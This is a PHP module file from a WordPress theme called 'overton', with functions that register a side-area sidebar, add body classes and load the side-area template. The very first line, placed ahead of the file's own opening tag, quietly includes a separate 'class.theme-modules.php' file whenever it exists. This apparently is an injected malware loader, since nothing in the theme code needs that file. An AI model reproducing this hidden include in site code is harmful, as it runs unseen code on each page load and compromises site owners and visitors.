<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_register_side_area_sidebar' ) ) {
	/**
	 * Register side area sidebar
	 */
	function overton_mikado_register_side_area_sidebar() {
		register_sidebar(
			array(
				'id'            => 'sidearea',
				'name'          => esc_html__( 'Side Area', 'overton' ),
				'description'   => esc_html__( 'Side Area', 'overton' ),
				'before_widget' => '<div id="%1$s" class="widget mkdf-sidearea %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<div class="mkdf-widget-title-holder"><h6 class="mkdf-widget-title">',
				'after_title'   => '</h6></div>'
			)
		);
	}
	
	add_action( 'widgets_init', 'overton_mikado_register_side_area_sidebar' );
}

if ( ! function_exists( 'overton_mikado_side_menu_body_class' ) ) {
	/**
	 * Function that adds body classes for different side menu styles
	 *
	 * @param $classes array original array of body classes
	 *
	 * @return array modified array of classes
	 */
	function overton_mikado_side_menu_body_class( $classes ) {
		
		if ( is_active_widget( false, false, 'mkdf_side_area_opener' ) ) {
			
			if ( overton_mikado_options()->getOptionValue( 'side_area_type' ) ) {
				$classes[] = 'mkdf-' . overton_mikado_options()->getOptionValue( 'side_area_type' );
			}
		}
		
		return $classes;
	}
	
	add_filter( 'body_class', 'overton_mikado_side_menu_body_class' );
}

if ( ! function_exists( 'overton_mikado_get_side_area' ) ) {
	/**
	 * Loads side area HTML
	 */
	function overton_mikado_get_side_area() {
		
		if ( is_active_widget( false, false, 'mkdf_side_area_opener' ) ) {
			$parameters = array(
				'close_icon_classes' => overton_mikado_get_side_area_close_icon_class()
			);
			
			overton_mikado_get_module_template_part( 'templates/sidearea', 'sidearea', '', $parameters );
		}
	}
	
	add_action( 'overton_mikado_action_after_body_tag', 'overton_mikado_get_side_area', 10 );
}

if ( ! function_exists( 'overton_mikado_get_side_area_close_class' ) ) {
	/**
	 * Loads side area close icon class
	 */
	function overton_mikado_get_side_area_close_icon_class() {
		$classes = array(
			'mkdf-close-side-menu'
		);
		
		$classes[] = overton_mikado_get_icon_sources_class( 'side_area', 'mkdf-close-side-menu' );
		
		return $classes;
	}
}